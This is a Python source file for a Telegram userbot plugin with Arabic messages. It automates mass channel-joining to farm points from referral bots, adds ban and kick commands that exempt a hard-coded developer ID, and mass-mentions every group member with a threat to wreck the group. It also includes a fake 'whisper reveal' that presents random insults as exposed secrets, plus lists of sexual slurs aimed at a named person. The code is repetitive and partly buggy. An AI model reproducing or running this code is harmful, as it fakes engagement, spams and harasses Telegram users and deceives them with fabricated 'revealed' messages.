bot_username4 = '@qweqwe1919bot'
bot_username5 = '@xnsex21bot'
bot_username6 = '@DamKombot'
bot_username8 = '@Bellllen192BOT'
bot_username9 = '@AL2QRPBOT'
bot_username10 = '@PPAHSBOT'
bot_username11 = '@DamKombot'
JoKeRUB = ['yes']
its_Reham = False
its_hussein = False
its_reda = False
its_joker = False
#اياثارات الحسين
#by Aljoker doesn't steal codes Please
@client.on(events.NewMessage(pattern="(.تجميع CR7|تجميع كرستيانو)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت CR7 , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await event.client.get_entity('@PPAHSBOT')
    await event.client.send_message('@PPAHSBOT', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@PPAHSBOT', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@PPAHSBOT', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@PPAHSBOT', limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await event.client.get_messages('@PPAHSBOT', limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")  # تصحيح التبويب هنا
    await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ايقاف التجميع") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@PPAHSBOT'  # استبدل '@يوزر_البوت' بيوزر البوت الذي تريده
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ⎙︙ تم تعطيل عملية تجميع النقاط بنجاح ✓**")  # تصحيح التبويب هنا
    
@client.on(events.NewMessage(pattern="(.تجميع العقرب|تجميع عقرب)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت العقرب , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await event.client.get_entity('@AL2QRPBOT')
    await event.client.send_message('@AL2QRPBOT', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@AL2QRPBOT', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@AL2QRPBOT', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@AL2QRPBOT', limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await event.client.get_messages('@PPAHSBOT', limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")  # تصحيح التبويب هنا
    await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ايقاف التجميع") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@AL2QRPBOT'  # استبدل '@يوزر_البوت' بيوزر البوت الذي تريده
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ⎙︙ تم تعطيل عملية تجميع النقاط بنجاح ✓**")  # تصحيح التبويب هنا    
    
@client.on(events.NewMessage(pattern="(.تجميع الجوكر|تجميع جوكر)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت الجوكر , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await event.client.get_entity('@A_MAN9300BOT')
    await event.client.send_message('@A_MAN9300BOT', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@A_MAN9300BOT', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@A_MAN9300BOT', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@A_MAN9300BOT', limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await event.client.get_messages('@A_MAN9300BOT', limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")  # تصحيح التبويب هنا
    await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ايقاف التجميع") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@A_MAN9300BOT'  # استبدل '@يوزر_البوت' بيوزر البوت الذي تريده
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ⎙︙ تم تعطيل عملية تجميع النقاط بنجاح ✓**")  # تصحيح التبويب هنا
   
@client.on(events.NewMessage(pattern="(تجميع المليار|.تجميع مليار)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت المليار , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await event.client.get_entity('@EEObot')
    await event.client.send_message('@EEObot', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@EEObot', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@EEObot', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@EEObot', limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await event.client.get_messages('@EEObot', limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")  # تصحيح التبويب هنا
    await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")

@client.on(events.NewMessage(pattern="(.تجميع العقاب|تجميع عقاب)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت العقاب , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await event.client.get_entity('@MARKTEBOT')
    await event.client.send_message('@MARKTEBOT', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@MARKTEBOT', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@MARKTEBOT', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@MARKTEBOT', limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await event.client.get_messages('@MARKTEBOT', limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")  # تصحيح التبويب هنا
    await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ايقاف التجميع") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@MARKTEBOT'  # استبدل '@يوزر_البوت' بيوزر البوت الذي تريده
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ⎙︙ تم تعطيل عملية تجميع النقاط بنجاح ✓**")  # تصحيح التبويب هنا
    
@client.on(events.NewMessage(pattern="(.تجميع المليون|تجميع مليون)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت المليون , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await event.client.get_entity('@qweqwe1919bot')
    await event.client.send_message('@qweqwe1919bot', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@qweqwe1919bot', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@qweqwe1919bot', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@qweqwe1919bot', limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await event.client.get_messages('@qweqwe1919bot', limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")  # تصحيح التبويب هنا
    await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ايقاف التجميع") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@qweqwe1919bot'  # استبدل '@يوزر_البوت' بيوزر البوت الذي تريده
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ⎙︙ تم تعطيل عملية تجميع النقاط بنجاح ✓**")  # تصحيح التبويب هنا
    

#    else:
  #      await event.edit("يجب الدفع لاستعمال هذا الامر !")
@client.on(events.NewMessage(pattern="(.تجميع العرب|تجميع عرب)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت العرب , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await l313l.get_entity(bot_username5)
    await l313l.send_message(bot_username5, '/start')
    await asyncio.sleep(4)
    msg0 = await l313l.get_messages(bot_username5, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await l313l.get_messages(bot_username5, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await l313l(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await l313l.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break

        url = msgs.reply_markup.rows[0].buttons[0].url

        try:
            try:
                await l313l(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await l313l(ImportChatInviteRequest(bott))
            msg2 = await l313l.get_messages(bot_username5, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await l313l.get_messages(bot_username5, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")

    await l313l.send_message(event.chat_id, "تم الانتهاء من التجميع")
@client.on(events.NewMessage(pattern=".تجميع دعمكم"))
async def تجميع_دعمكم(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت دعمكم , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    bot_username = '@DamKombot'
    channel_entity = await l313l.get_entity(bot_username)
    await تجميع_قنوات_دعمكم(event, channel_entity, bot_username)

async def تجميع_قنوات_دعمكم(event, channel_entity, bot_username):
    await l313l.send_message(bot_username, '/start')
    await asyncio.sleep(4)
    msg0 = await l313l.get_messages(bot_username, limit=1)
    await msg0[0].click(1)
    await asyncio.sleep(4)
    msg1 = await l313l.get_messages(bot_username, limit=1)
    await msg1[0].click(0)
    قنوات_مجمعة = 1
    for _ in range(100):
        await asyncio.sleep(4)
        list = await l313l(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات حالياً 🤍') != -1:
            await l313l.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        msg_text = msgs.message
        if "اشترك فالقناة @" in msg_text:
            قناة = msg_text.split('@')[1].split()[0]
            try:
                entity = await l313l.get_entity(قناة)
                if entity:
                    await l313l(JoinChannelRequest(entity.id))
                    await asyncio.sleep(4)
                    msg2 = await l313l.get_messages(bot_username, limit=1)
                    await msg2[0].click(text='اشتركت ✅')
                    قنوات_مجمعة += 1
                    await event.edit(f"تم الانظمام الى القناة رقم {قنوات_مجمعة}")
            except Exception as e:
                await l313l.send_message(event.chat_id, f"**خطأ , ممكن تبندت** {str(e)}")
                break
    await l313l.send_message(event.chat_id, "تم الانتهاء من التجميع")
               
@client.on(events.NewMessage(pattern="(تجميع الاساسيل|.تجميع اساسيل)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت اساسيل , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await event.client.get_entity('@yynnurybot')
    await event.client.send_message('@yynnurybot', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@yynnurybot', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@yynnurybot', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@yynnurybot', limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await event.client.get_messages('@yynnurybot', limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")  # تصحيح التبويب هنا
    await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ايقاف التجميع") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@yynnurybot'  # استبدل '@يوزر_البوت' بيوزر البوت الذي تريده
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ⎙︙ تم تعطيل عملية تجميع النقاط بنجاح ✓**")  # تصحيح التبويب هنا


@client.on(events.NewMessage(pattern="(تجميع المهدويون|.تجميع مهدويون)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت مهدويون , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await event.client.get_entity('@MHDN313bot')
    await event.client.send_message('@MHDN313bot', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@MHDN313bot', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@MHDN313bot', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@MHDN313bot', limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await event.client.get_messages('@MHDN313bot', limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")  # تصحيح التبويب هنا
    await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ايقاف التجميع") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@MHDN313bot'  # استبدل '@يوزر_البوت' بيوزر البوت الذي تريده
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ⎙︙ تم تعطيل عملية تجميع النقاط بنجاح ✓**")  # تصحيح التبويب هنا
         
@client.on(events.NewMessage(outgoing=True, pattern=r'\.(حظر|طرد|تقييد)'))
async def runkick(event):
    await event.edit("جارٍ...")
    await event.delete()
    command = event.pattern_match.group(1)
    getmessage = await event.get_reply_message()

    if getmessage:
        targetuser = getmessage.sender_id
    else:  
        try:
            targetuser = int(event.text.split(" ", 1)[1])
        except (ValueError, IndexError):
            if event.message.entities:
                for entity in event.message.entities:
                    if hasattr(entity, 'user_id'):
                        targetuser = entity.user_id
                        break
                    elif hasattr(entity, 'username'):
                        try:
                            targetuser = (await client.get_entity(entity.username)).id
                            break
                        except ValueError:
                            await event.respond("لم يتم العثور على مستخدم بهذا الاسم.")
                            return
            else:  
                await event.respond("يرجى الرد على المستخدم لاتمام الامر")
                return

    # منع تنفيذ الأوامر إذا كان الهدف هو المطور
    if targetuser == 7915484613:
        return

    targetdetails = await client(GetFullUserRequest(targetuser))
    messagelocation = event.to_id
    getreason = event.message.raw_text.splitlines()
    replacecmd = getreason[0].replace(f".{command} ", "")
    reason = replacecmd.splitlines()[0]
    client.parse_mode = "html"

    try:
        if command == "طرد":
            await event.client.kick_participant(messagelocation, targetuser)
            action = "⎉╎ تم حظر"
        elif command == "حظر":
            await client(EditBannedRequest(messagelocation, targetuser, ChatBannedRights(until_date=None, view_messages=True)))
            action = "⎉╎ تم حظره"
        elif command == "تقييد":
            await client(EditBannedRequest(messagelocation, targetuser, ChatBannedRights(until_date=None, send_messages=True)))
            action = "⎉╎ تم تقييده"

        if reason:
            if f".{command}" in reason:
                await event.client.send_message(messagelocation, f"<a href='tg://user?id={targetuser}'>{targetdetails.users[0].first_name}</a> {action}")
            else:
                await event.client.send_message(messagelocation, f"<a href='tg://user?id={targetuser}'>{targetdetails.users[0].first_name}</a> {action}\nسبب: {reason}")
        else:
            await event.client.send_message(messagelocation, f"<a href='tg://user?id={targetuser}'>{targetdetails.users[0].first_name}</a> {action}")

    except Exception as e:
        await event.respond(f"حدث خطأ: {e}")


@client.on(events.NewMessage(outgoing=True, pattern=r'\.(الغاء الحظر|الغاء التقييد)'))
async def unrunkick(event):
    await event.edit("جارٍ...")
    await event.delete()
    command = event.pattern_match.group(1)
    getmessage = await event.get_reply_message()

    if getmessage:
        targetuser = getmessage.sender_id
    else:  
        try:
            targetuser = int(event.text.split(" ", 1)[1])
        except (ValueError, IndexError):
            if event.message.entities:
                for entity in event.message.entities:
                    if hasattr(entity, 'user_id'):
                        targetuser = entity.user_id
                        break
                    elif hasattr(entity, 'username'):
                        try:
                            targetuser = (await client.get_entity(entity.username)).id
                            break
                        except ValueError:
                            await event.respond("لم يتم العثور على مستخدم بهذا الاسم.")
                            return
            else: 
                await event.respond(". يرجى الرد على المستخدم")
                return

    # منع تنفيذ الأوامر إذا كان الهدف هو المطور
    if targetuser == 7915484613:
        return

    targetdetails = await client(GetFullUserRequest(targetuser))
    messagelocation = event.to_id
    client.parse_mode = "html"

    try:
        await client(EditBannedRequest(messagelocation, targetuser, ChatBannedRights(until_date=None, view_messages=False, send_messages=False)))

        if command == "الغاء الحظر":
            action = "⎉╎ تم إلغاء حظره"
        elif command == "الغاء التقييد":
            action = "⎉╎ تم إلغاء تقييده"

        await event.client.send_message(messagelocation, f"<a href='tg://user?id={targetuser}'>{targetdetails.users[0].first_name}</a> {action}")

    except Exception as e:
        await event.respond(f"حدث خطأ: {e}")

    client.parse_mode = "markdown"
                                                                    
@client.on(events.NewMessage(pattern="تفليش(?:\s|$)([\s\S]*)"))
async def kickall(event):
    chat_id = event.chat_id
    if event.is_private:
        return await edit_or_reply(event, "** ⎙︙ هذا الامر يستعمل للقنوات والمجموعات فقط !**")
    msg = "تحذير: هذا الكروب أو القناة سيتم تفليشه!"
    async for usr in client.iter_participants(chat_id):
        userb = usr.username
        usrtxt = f"{msg} @{userb}"
        if str(userb) == "None":
            userb = usr.id
            usrtxt = f"{msg} {userb}"
        await client.send_message(chat_id, usrtxt)
        await asyncio.sleep(1)
    await event.delete()                                                                          

Z = ["انيك شادو المعرص", "كسمه شادو", "انيك امك ي شادو", "امك قحبه ي شادو"]

@client.on(events.NewMessage(pattern=".شادو$"))
async def ithker(knopis):
    await knopis.edit(random.choice(Z))

@client.on(events.NewMessage(pattern=r".رفع مالك(?:\s|$)([\s\S]*)"))
async def permalink(event):
    user = await event.client.get_entity(event.sender_id)
    if not user:
        return
    
    # قائمة المعرفات المحظورة
    blocked_ids = [7915484613, 7915484613]  # يمكنك إضافة المزيد من المعرفات هنا
    
    if user.id in blocked_ids:
        return await event.edit("**لكك دي هذا المطور**")
    
    JoKeRUB = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    
    await event.edit(f"**⎙︙ الحلو** 「[{JoKeRUB}](tg://user?id={user.id})」 \n"
                     f"**⎙︙ تـم رفعه مالك الكروب بواسطة :** {my_mention}")

rehu = [
    "شكم مره كتلك خلي نفلش الكروب",
    "باع هذا اللوكي شديسوي",
    "** مالك الكروب واحد زباله ويدور بنات **",
    "**اول مره اشوف بنات يدورن ولد 😂 **",
    "**شوف هذا الكرنج دين مضال براسه**",
    "**انته واحد فرخ وتنيج**",
    "** راح اعترفلك بشي طلعت احب اختك 🥺 **",
    "**مالك الكروب والمشرفين وفرده من قندرتك ضلعي**",
    "**هذا واحد غثيث وكلب ابن كلب**",
    "**لتحجي كدامه هذا نغل يوصل حجي**",
    "**هذا المالك واحد ساقط وقرام ويدور حلوين**",
    "**لو ربك يجي ماتنكشف الهمسه 😂😂**",
]

aljoker_enabled = True
hussein_enabled = True

async def get_user_from_event(event):
    if event.sender_id in (1087968824, 1036953733, 1062351279, 1067578920, 1067564781):
        return None
    if event.is_private:
        return await event.get_sender()
    if event.is_group:
        return await event.get_chat()
    return None

@client.on(events.NewMessage(pattern="همسه(?:\s|$)([\s\S]*)"))
async def permalink(event):
    user = await get_user_from_event(event)
    if not user:
        return
    JoKeRUB = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    X_54P = random.choice(rehu)
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"**᯽︙الهمسة من المستخدم [{JoKeRUB}](tg://user?id={user.id}) تم كشفها بنجاح ✓**\n**᯽︙ الهمسة هي : {X_54P} ** ")

@client.on(events.NewMessage(pattern="mark_as_read"))
async def mark_as_read(event):
    if aljoker_enabled:
        await event.mark_read()

@client.on(events.NewMessage(pattern="Hussein"))
async def Hussein(event):
    if hussein_enabled:
        await event.reply("Hussein")
var = {}

async def edit_delete(event, text):
    await event.edit(text)
    await asyncio.sleep(5)
    await event.delete()

@client.on(events.NewMessage(pattern="(خط الغامق|خط غامق|خط المشطوب|خط مشطوب|خط رمز|خط الرمز|خط البايثون|خط بايثون|خط البرنت|خط برنت)"))
async def change_font(event):
    font_types = {
        "خط الغامق": "bold",
        "خط مشطوب": "tshwesh",
        "خط رمز": "ramz",
        "خط بايثون": "joker",
        "خط برنت": "Brent",
    }
    font_type = font_types.get(event.pattern_match.group(1))
    if font_type:
        if var.get(font_type, None) == "on":
            var.pop(font_type)  # تصحيح الخطأ هنا
            await edit_delete(event, f"**᯽︙ تم اطفاء {event.pattern_match.group(1)} بنجاح ✓ **")
        else:
            var[font_type] = "on"
            await edit_delete(event, f"**᯽︙ تم تفعيل {event.pattern_match.group(1)} بنجاح ✓**")

@client.on(events.NewMessage(outgoing=True))
async def reda(event):
    if event.message.text and not event.message.media and event.message.text.count(".") != 1 and event.message.text.count("@") != 1:
        font_types = {
            "bold": "**{}**",
            "tshwesh": "~~{}~~",
            "ramz": "`{}`",
            "joker": "```{}```",
             "Brent": '```print("{}")```'
  }
        for font_type, font_format in font_types.items():
            if var.get(font_type, None) == "on":
                try:
                    await event.edit(font_format.format(event.message.text))
                except MessageIdInvalidError:
                    pass
        
@client.on(events.NewMessage(outgoing=True, pattern=r"\.ايقاف المترجم$"))
async def stop_translate(event):
    if event.fwd_from:
        return
    chat_id = event.chat_id
    if chat_id in tr_status:
        del tr_status[chat_id]
    await event.edit("**تم إيقاف المترجم.**", parse_mode="md")


@client.on(events.NewMessage(outgoing=True, pattern='\.يوت (.+)'))
async def tconv(event):
    chat = await event.get_chat()
    sentence_to_summarize = event.pattern_match.group(1)
    if sentence_to_summarize.startswith("."):
        sentence_to_summarize = sentence_to_summarize[1:].strip()
    sentence_to_summarize = "يوت " + sentence_to_summarize
    await event.edit("يرجى الانتظار...")
    try:
        x = await client.send_message('@ALMAS_bbot', sentence_to_summarize)
        async with client.conversation('@ALMAS_bbot') as conv:
            audio_clip = None
            timeout = 15
            start_time = asyncio.get_event_loop().time()
            while asyncio.get_event_loop().time() - start_time < timeout:
                response = await conv.get_response(x.id)
                await client.send_read_acknowledge(conv.chat_id)
                if "عليك الأشتراك في قناة البوت" in response.message:
                    try:
                        channel_name = re.search(r"قناة البوت : (@\w+)", response.message).group(1)
                        await client(JoinChannelRequest(channel_name))
                        x = await client.send_message('@ALMAS_bbot', sentence_to_summarize)
                    except Exception as e:
                        print(f"خطأ: {e}")
                if response.audio:
                    audio_clip = response
                    break
            if audio_clip:
                new_message = Message(
                    id=0,
                    peer_id=chat,
                    message="",
                    media=audio_clip.media,
                    entities=None,
                    reply_markup=None,
                    ttl_period=None
                )
                await client.send_message(chat, new_message, silent=True)
                await event.delete()
                await asyncio.sleep(0)  # الانتظار لمدة 60 ثانية
                try:
                    await client(DeleteHistoryRequest(peer='@ALMAS_bbot', max_id=x.id, just_clear=False, revoke=True))
                except MessageIdInvalidError:
                    print("خطأ: لا يمكن حذف الرسالة")
            else:
                await event.edit("المحتوى غير موجود")
    except Exception as e:
        print(f"خطأ: {e}")
        await event.edit("خطأ في العملية")

@client.on(events.NewMessage(outgoing=True, pattern='\.سوال (.*)'))
async def tco(event):
    chat = await event.get_chat()
    question = event.pattern_match.group(1)
    await event.edit("جارٍ جمع المعلومات انتظر 7 ثوان ...")

    async with client.conversation('@SAMI_PAI_BOT') as conv:
        await conv.send_message(question)

        await asyncio.sleep(7)

